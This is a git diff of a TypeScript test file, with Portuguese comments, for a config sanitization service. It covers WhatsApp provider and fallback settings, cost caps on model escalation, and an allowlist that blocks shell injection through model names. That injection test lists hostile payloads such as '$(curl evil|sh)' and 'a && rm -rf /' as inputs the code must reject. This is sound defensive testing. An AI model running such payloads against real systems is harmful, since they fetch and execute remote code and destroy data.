@@ -8,7 +8,7 @@ import { atomicWriteSync } from '../../utils/atomicWrite';
 const mockedFs = vi.mocked(fs);
 const mockedWrite = vi.mocked(atomicWriteSync);
 
-import { UiConfigService, sanitizeActionGovernance, sanitizeFeatureSwitches, sanitizeNotificationPolicy } from '../../services/uiConfigService';
+import { UiConfigService, sanitizeActionGovernance, sanitizeFeatureSwitches, sanitizeNotificationPolicy, sanitizeWhatsappFallbackPolicy, sanitizeWhatsappProvider } from '../../services/uiConfigService';
 
 describe('uiConfigService', () => {
     beforeEach(() => {
@@ -84,11 +84,54 @@ describe('uiConfigService', () => {
         expect(out3.taskAutomation.judgeModel).toBe(''); // tipo errado → default (não quebra)
     });
 
+    it('#RCE (red-team Fable): allowlist de charset em TODOS os nomes de modelo (anti shell-injection)', () => {
+        const svc = new UiConfigService('ui.json');
+        // Defaults dos modelos do coder
+        expect(svc.get().taskAutomation.coderModel).toBe('');
+        expect(svc.get().taskAutomation.coderFallbackModel).toBe('');
+        // Nomes REAIS passam intactos (provider/name, tags, versões, IDs longos)
+        for (const good of ['opus', 'minimax/MiniMax-M3', 'zai-coding-plan/glm-5.2', 'us.anthropic.claude-opus-4-5-v1:0', 'openrouter/anthropic/claude-3.5-sonnet']) {
+            expect(svc.update({ taskAutomation: { coderModel: good } } as any).taskAutomation.coderModel).toBe(good);
+        }
+        // Payloads de INJEÇÃO → rejeitados p/ '' (secure-default: herda env, não vai pro shell)
+        for (const evil of ['x; touch PWNED', '$(curl evil|sh)', '`id`', 'a && rm -rf /', 'a|b', 'a"b', "a'b", 'a b', 'a\nb', 'a>b', 'a&b']) {
+            expect(svc.update({ taskAutomation: { coderModel: evil } } as any).taskAutomation.coderModel).toBe('');
+            // MESMA proteção nos 3 modelos que vão ao shell (retrofit dos 2 que já existiam = RCE latente)
+            expect(svc.update({ taskAutomation: { judgeModel: evil } } as any).taskAutomation.judgeModel).toBe('');
+            expect(svc.update({ taskAutomation: { coderEscalationModel: evil } } as any).taskAutomation.coderEscalationModel).toBe('opus'); // default do escalation
+            expect(svc.update({ taskAutomation: { coderFallbackModel: evil } } as any).taskAutomation.coderFallbackModel).toBe('');
+        }
+        // vazio explícito = herda (não é erro)
+        expect(svc.update({ taskAutomation: { coderModel: '   ' } } as any).taskAutomation.coderModel).toBe('');
+    });
+
     it('taskAutomation item 29: piso de nota SANE = 5 (não aceita <5 para aprovar/mergear)', () => {
         const svc = new UiConfigService('ui.json');
         const out = svc.update({ taskAutomation: { minMergeScore: 2, minApproveScore: 1 } } as any);
         expect(out.taskAutomation.minMergeScore).toBe(5);   // 2 → piso 5
         expect(out.taskAutomation.minApproveScore).toBe(5); // 1 → piso 5
+    });
+
+    it('#escalada-opus: defaults conservadores + clamps das travas de custo (nunca undefined)', () => {
+        const svc = new UiConfigService('ui.json');
+        // defaults fail-closed
+        expect(svc.get().taskAutomation).toMatchObject({
+            opusEscalationEnabled: false, maxOpusEscalationsPerDay: 2, maxOpusCostUsdPerDay: 5, coderEscalationModel: 'opus',
+        });
+        // clamps de SANIDADE (configurável na UI): custo 0-500, escaladas 0-100, model trim/cap; enabled só com true explícito
+        const out = svc.update({ taskAutomation: { opusEscalationEnabled: true, maxOpusEscalationsPerDay: 99, maxOpusCostUsdPerDay: 999, coderEscalationModel: '  sonnet  ' } } as any);
+        expect(out.taskAutomation.opusEscalationEnabled).toBe(true);
+        expect(out.taskAutomation.maxOpusEscalationsPerDay).toBe(99);   // 99 dentro do teto 100 → mantém
+        expect(out.taskAutomation.maxOpusCostUsdPerDay).toBe(500);      // 999 → teto 500
+        expect(out.taskAutomation.coderEscalationModel).toBe('sonnet'); // trim
+        // acima do teto de sanidade → clampa (guarda-corpo anti-typo)
+        const outCap = svc.update({ taskAutomation: { maxOpusEscalationsPerDay: 9999, maxOpusCostUsdPerDay: 999999 } } as any);
+        expect(outCap.taskAutomation.maxOpusEscalationsPerDay).toBe(100);
+        expect(outCap.taskAutomation.maxOpusCostUsdPerDay).toBe(500);
+        // valores inválidos → default (NUNCA undefined/ilimitado no teto $)
+        const out2 = svc.update({ taskAutomation: { opusEscalationEnabled: 'yes', maxOpusCostUsdPerDay: 'lots' } } as any);
+        expect(out2.taskAutomation.opusEscalationEnabled).toBe(false);
+        expect(out2.taskAutomation.maxOpusCostUsdPerDay).toBe(5);
     });
 
     // #1204 — kill-switches de automações de fundo (default true = nada muda).
@@ -122,35 +165,35 @@ describe('uiConfigService', () => {
     // #1129 — kill-switches perigosos (DRY_RUN / FINANCIAL_COMMANDS / CRM_CONTEXT).
     it('featureSwitches: defaults dryRun/financial OFF e crmContext ON (secure-default)', () => {
         const svc = new UiConfigService('ui.json');
-        expect(svc.get().featureSwitches).toEqual({ dryRunMode: false, financialCommands: false, crmContextInjection: true });
+        expect(svc.get().featureSwitches).toEqual({ dryRunMode: false, financialCommands: false, crmContextInjection: true, whatsappEmployeeElevation: false });
     });
 
     it('featureSwitches: round-trip do PUT persiste os 3 flags (false sobrevive ao sanitize)', () => {
         const svc = new UiConfigService('ui.json');
         const out = svc.update({ featureSwitches: { dryRunMode: true, financialCommands: true, crmContextInjection: false } } as any);
-        expect(out.featureSwitches).toEqual({ dryRunMode: true, financialCommands: true, crmContextInjection: false });
+        expect(out.featureSwitches).toEqual({ dryRunMode: true, financialCommands: true, crmContextInjection: false, whatsappEmployeeElevation: false });
         // como o sanitize substitui o bloco inteiro (mesmo padrão do automationSwitches), religar só o
         // crm mantém o que foi enviado e leva os demais aos defaults (OFF).
         const out2 = svc.update({ featureSwitches: { crmContextInjection: true } } as any);
-        expect(out2.featureSwitches).toEqual({ dryRunMode: false, financialCommands: false, crmContextInjection: true });
+        expect(out2.featureSwitches).toEqual({ dryRunMode: false, financialCommands: false, crmContextInjection: true, whatsappEmployeeElevation: false });
     });
 
     it('featureSwitches: sanitize aceita só booleano explícito; ausente/inválido → default', () => {
         // flag ausente → default respectivo
-        expect(sanitizeFeatureSwitches({ dryRunMode: true })).toEqual({ dryRunMode: true, financialCommands: false, crmContextInjection: true });
+        expect(sanitizeFeatureSwitches({ dryRunMode: true })).toEqual({ dryRunMode: true, financialCommands: false, crmContextInjection: true, whatsappEmployeeElevation: false });
         // valor inválido (string/number) → default (não coerção implícita)
         expect(sanitizeFeatureSwitches({ dryRunMode: 'yes', financialCommands: 1, crmContextInjection: 'false' }))
-            .toEqual({ dryRunMode: false, financialCommands: false, crmContextInjection: true });
+            .toEqual({ dryRunMode: false, financialCommands: false, crmContextInjection: true, whatsappEmployeeElevation: false });
         // payload inteiro inválido → defaults
-        expect(sanitizeFeatureSwitches(null)).toEqual({ dryRunMode: false, financialCommands: false, crmContextInjection: true });
-        expect(sanitizeFeatureSwitches('lixo')).toEqual({ dryRunMode: false, financialCommands: false, crmContextInjection: true });
+        expect(sanitizeFeatureSwitches(null)).toEqual({ dryRunMode: false, financialCommands: false, crmContextInjection: true, whatsappEmployeeElevation: false });
+        expect(sanitizeFeatureSwitches('lixo')).toEqual({ dryRunMode: false, financialCommands: false, crmContextInjection: true, whatsappEmployeeElevation: false });
     });
 
     it('featureSwitches: load() preenche defaults quando o arquivo não tem o bloco', () => {
         mockedFs.existsSync.mockReturnValue(true);
         mockedFs.readFileSync.mockReturnValue(JSON.stringify({ companyName: 'X' }) as any);
         const svc = new UiConfigService('ui.json');
-        expect(svc.get().featureSwitches).toEqual({ dryRunMode: false, financialCommands: false, crmContextInjection: true });
+        expect(svc.get().featureSwitches).toEqual({ dryRunMode: false, financialCommands: false, crmContextInjection: true, whatsappEmployeeElevation: false });
     });
 
     it('update aplica e persiste campos válidos', () => {
@@ -473,5 +516,213 @@ describe('sanitizeNotificationPolicy', () => {
         svc.update({ notificationPolicy: { staleHours: 48 } } as any);
         const out = svc.update({ companyName: 'Novo' });
         expect(out.notificationPolicy.staleHours).toBe(48);
+    });
+
+    // #1439 — sessionId primário do WhatsApp (default global p/ scheduler).
+    describe('whatsappPrimarySessionId (#1439)', () => {
+        it('default vazio = delega ao resolveSession em runtime', () => {
+            const svc = new UiConfigService('ui.json');
+            expect(svc.get().whatsappPrimarySessionId).toBe('');
+        });
+
+        it('round-trip do PUT persiste o valor (trim + cap 80)', () => {
+            const svc = new UiConfigService('ui.json');
+            const out = svc.update({ whatsappPrimarySessionId: '  sessao-principal  ' } as any);
+            expect(out.whatsappPrimarySessionId).toBe('sessao-principal'); // trim
+            const out2 = svc.update({ whatsappPrimarySessionId: 'x'.repeat(200) } as any);
+            expect(out2.whatsappPrimarySessionId.length).toBe(80); // cap
+            const out3 = svc.update({ whatsappPrimarySessionId: '' } as any);
+            expect(out3.whatsappPrimarySessionId).toBe(''); // vazio é válido (= resolveSession decide)
+        });
+
+        it('load() carrega valor persistido; campo ausente ou tipo errado → vazio', () => {
+            // valor válido persistido
+            mockedFs.existsSync.mockReturnValue(true);
+            mockedFs.readFileSync.mockReturnValue(JSON.stringify({ whatsappPrimarySessionId: 'v4' }) as any);
+            expect(new UiConfigService('ui.json').get().whatsappPrimarySessionId).toBe('v4');
+
+            // campo ausente (arquivo antigo)
+            mockedFs.readFileSync.mockReturnValue(JSON.stringify({ companyName: 'X' }) as any);
+            expect(new UiConfigService('ui.json').get().whatsappPrimarySessionId).toBe('');
+
+            // tipo errado → string vazia (não quebra)
+            mockedFs.readFileSync.mockReturnValue(JSON.stringify({ whatsappPrimarySessionId: 123 }) as any);
+            expect(new UiConfigService('ui.json').get().whatsappPrimarySessionId).toBe('');
+        });
+    });
+
+    // #1437 — política aplicada pelo `channelRouter.resolveSession` quando a sessão primária
+    // não está WORKING. Domínio fechado: 'fail' | 'first-working'; qualquer outro valor (incl.
+    // null/undefined/string vazia/número/string parecida em maiúsculas/objeto/array) cai no
+    // default seguro 'fail' — não persiste valor perigoso e não quebra o boot se o JSON
+    // persistido estiver corrompido.
+    describe('sanitizeWhatsappFallbackPolicy (#1437)', () => {
+        it('aceita os dois valores válidos do domínio', () => {
+            expect(sanitizeWhatsappFallbackPolicy('fail')).toBe('fail');
+            expect(sanitizeWhatsappFallbackPolicy('first-working')).toBe('first-working');
+        });
+
+        it('rejeita null/undefined/string vazia → default seguro \'fail\'', () => {
+            expect(sanitizeWhatsappFallbackPolicy(null)).toBe('fail');
+            expect(sanitizeWhatsappFallbackPolicy(undefined)).toBe('fail');
+            expect(sanitizeWhatsappFallbackPolicy('')).toBe('fail');
+        });
+
+        it('rejeita case variants e strings parecidas (case-sensitive, sem trim)', () => {
+            expect(sanitizeWhatsappFallbackPolicy('FAIL')).toBe('fail');
+            expect(sanitizeWhatsappFallbackPolicy('Fail')).toBe('fail');
+            expect(sanitizeWhatsappFallbackPolicy('First-Working')).toBe('fail');
+            expect(sanitizeWhatsappFallbackPolicy('fail ')).toBe('fail');
+            expect(sanitizeWhatsappFallbackPolicy(' fail')).toBe('fail');
+            expect(sanitizeWhatsappFallbackPolicy('first_working')).toBe('fail'); // underscore em vez de hífen
+            expect(sanitizeWhatsappFallbackPolicy('firstworking')).toBe('fail');
+            expect(sanitizeWhatsappFallbackPolicy('first-working ')).toBe('fail');
+        });
+
+        it('rejeita outros tipos (número, boolean, objeto, array) → default', () => {
+            expect(sanitizeWhatsappFallbackPolicy(0)).toBe('fail');
+            expect(sanitizeWhatsappFallbackPolicy(1)).toBe('fail');
+            expect(sanitizeWhatsappFallbackPolicy(true)).toBe('fail');
+            expect(sanitizeWhatsappFallbackPolicy(false)).toBe('fail');
+            expect(sanitizeWhatsappFallbackPolicy({})).toBe('fail');
+            expect(sanitizeWhatsappFallbackPolicy({ value: 'first-working' })).toBe('fail');
+            expect(sanitizeWhatsappFallbackPolicy([])).toBe('fail');
+            expect(sanitizeWhatsappFallbackPolicy(['first-working'])).toBe('fail');
+        });
+    });
+
+    describe('whatsappFallbackPolicy (#1437) — persistência da política de fallback', () => {
+        it('default: campo ausente no arquivo → \'fail\' (comportamento atual preservado)', () => {
+            const svc = new UiConfigService('ui.json');
+            expect(svc.get().whatsappFallbackPolicy).toBe('fail');
+        });
+
+        it('round-trip do PUT persiste o valor válido', () => {
+            const svc = new UiConfigService('ui.json');
+            const out = svc.update({ whatsappFallbackPolicy: 'first-working' } as any);
+            expect(out.whatsappFallbackPolicy).toBe('first-working');
+            expect(mockedWrite).toHaveBeenCalled();
+            const written = mockedWrite.mock.calls[mockedWrite.mock.calls.length - 1][1] as any;
+            expect(written.whatsappFallbackPolicy).toBe('first-working');
+        });
+
+        it('update(): valor fora do domínio é descartado no sanitize (cai no default \'fail\')', () => {
+            const svc = new UiConfigService('ui.json');
+            const out = svc.update({ whatsappFallbackPolicy: 'fail-strict' } as any);
+            expect(out.whatsappFallbackPolicy).toBe('fail');
+        });
+
+        it('load(): valor válido persistido é preservado; valor inválido cai no default', () => {
+            // válido
+            mockedFs.existsSync.mockReturnValue(true);
+            mockedFs.readFileSync.mockReturnValue(JSON.stringify({ whatsappFallbackPolicy: 'first-working' }) as any);
+            expect(new UiConfigService('ui.json').get().whatsappFallbackPolicy).toBe('first-working');
+
+            // inválido → default (não quebra o boot)
+            mockedFs.readFileSync.mockReturnValue(JSON.stringify({ whatsappFallbackPolicy: 'fail-strict' }) as any);
+            expect(new UiConfigService('ui.json').get().whatsappFallbackPolicy).toBe('fail');
+
+            // tipo errado → default
+            mockedFs.readFileSync.mockReturnValue(JSON.stringify({ whatsappFallbackPolicy: 42 }) as any);
+            expect(new UiConfigService('ui.json').get().whatsappFallbackPolicy).toBe('fail');
+
+            // null → default
+            mockedFs.readFileSync.mockReturnValue(JSON.stringify({ whatsappFallbackPolicy: null }) as any);
+            expect(new UiConfigService('ui.json').get().whatsappFallbackPolicy).toBe('fail');
+
+            // ausente → default
+            mockedFs.readFileSync.mockReturnValue(JSON.stringify({ companyName: 'X' }) as any);
+            expect(new UiConfigService('ui.json').get().whatsappFallbackPolicy).toBe('fail');
+        });
+
+        it('update(): whatsappFallbackPolicy ausente do partial mantém o valor atual', () => {
+            const svc = new UiConfigService('ui.json');
+            svc.update({ whatsappFallbackPolicy: 'first-working' } as any);
+            const out = svc.update({ companyName: 'Outra' });
+            expect(out.whatsappFallbackPolicy).toBe('first-working'); // preservado
+        });
+    });
+
+    // #1410 — override persistente do provider WhatsApp. Sem este sanitize, o "setter fantasma"
+    // das rotas admin/integration ficava restrito a mudar em memória (resolveBootWhatsAppProvider
+    // só lê o campo, e um valor corrompido/string fora do domínio quebraria o boot).
+    describe('sanitizeWhatsappProvider (#1410)', () => {
+        it('aceita os dois valores válidos do domínio', () => {
+            expect(sanitizeWhatsappProvider('legacy')).toBe('legacy');
+            expect(sanitizeWhatsappProvider('moltbot')).toBe('moltbot');
+        });
+
+        it('rejeita null/undefined → undefined (cai no env)', () => {
+            expect(sanitizeWhatsappProvider(null)).toBeUndefined();
+            expect(sanitizeWhatsappProvider(undefined)).toBeUndefined();
+        });
+
+        it('rejeita string vazia, número, boolean e strings parecidas mas inválidas', () => {
+            expect(sanitizeWhatsappProvider('')).toBeUndefined();
+            expect(sanitizeWhatsappProvider('LEGACY')).toBeUndefined();   // case-sensitive
+            expect(sanitizeWhatsappProvider('legacy ')).toBeUndefined();  // não trim
+            expect(sanitizeWhatsappProvider('legacy\n')).toBeUndefined();
+            expect(sanitizeWhatsappProvider('legacy2')).toBeUndefined();
+            expect(sanitizeWhatsappProvider('zapi')).toBeUndefined();     // nem é do domínio
+            expect(sanitizeWhatsappProvider(0)).toBeUndefined();
+            expect(sanitizeWhatsappProvider(1)).toBeUndefined();
+            expect(sanitizeWhatsappProvider(true)).toBeUndefined();
+            expect(sanitizeWhatsappProvider({})).toBeUndefined();
+            expect(sanitizeWhatsappProvider([])).toBeUndefined();
+        });
+    });
+
+    describe('whatsappProvider (#1410) — persistência do override', () => {
+        it('default: campo ausente no arquivo → undefined (cai no env)', () => {
+            mockedFs.existsSync.mockReturnValue(true);
+            mockedFs.readFileSync.mockReturnValue(JSON.stringify({ companyName: 'X' }) as any);
+            expect(new UiConfigService('ui.json').get().whatsappProvider).toBeUndefined();
+        });
+
+        it('load(): valor válido persistido é preservado; valor inválido é descartado', () => {
+            // válido
+            mockedFs.existsSync.mockReturnValue(true);
+            mockedFs.readFileSync.mockReturnValue(JSON.stringify({ whatsappProvider: 'moltbot' }) as any);
+            expect(new UiConfigService('ui.json').get().whatsappProvider).toBe('moltbot');
+
+            // inválido → cai no env (não quebra o boot)
+            mockedFs.readFileSync.mockReturnValue(JSON.stringify({ whatsappProvider: 'zapi' }) as any);
+            expect(new UiConfigService('ui.json').get().whatsappProvider).toBeUndefined();
+
+            // tipo errado → undefined
+            mockedFs.readFileSync.mockReturnValue(JSON.stringify({ whatsappProvider: 42 }) as any);
+            expect(new UiConfigService('ui.json').get().whatsappProvider).toBeUndefined();
+        });
+
+        it('update(): round-trip persiste o override (e salva no disco via atomicWriteSync)', () => {
+            const svc = new UiConfigService('ui.json');
+            const out = svc.update({ whatsappProvider: 'moltbot' } as any);
+            expect(out.whatsappProvider).toBe('moltbot');
+            expect(mockedWrite).toHaveBeenCalled();
+            const written = mockedWrite.mock.calls[mockedWrite.mock.calls.length - 1][1] as any;
+            expect(written.whatsappProvider).toBe('moltbot');
+        });
+
+        it('update(): null/undefined explícito remove o override (volta ao env)', () => {
+            const svc = new UiConfigService('ui.json');
+            svc.update({ whatsappProvider: 'moltbot' } as any);
+            expect(svc.get().whatsappProvider).toBe('moltbot');
+            // reset
+            const out = svc.update({ whatsappProvider: null } as any);
+            expect(out.whatsappProvider).toBeUndefined();
+        });
+
+        it('update(): valor inválido é descartado no sanitize (não persiste)', () => {
+            const svc = new UiConfigService('ui.json');
+            const out = svc.update({ whatsappProvider: 'zapi' } as any);
+            expect(out.whatsappProvider).toBeUndefined();
+        });
+
+        it('update(): whatsappProvider ausente do partial mantém o valor atual', () => {
+            const svc = new UiConfigService('ui.json');
+            svc.update({ whatsappProvider: 'moltbot' } as any);
+            const out = svc.update({ companyName: 'Outra' });
+            expect(out.whatsappProvider).toBe('moltbot'); // preservado
+        });
     });
 });
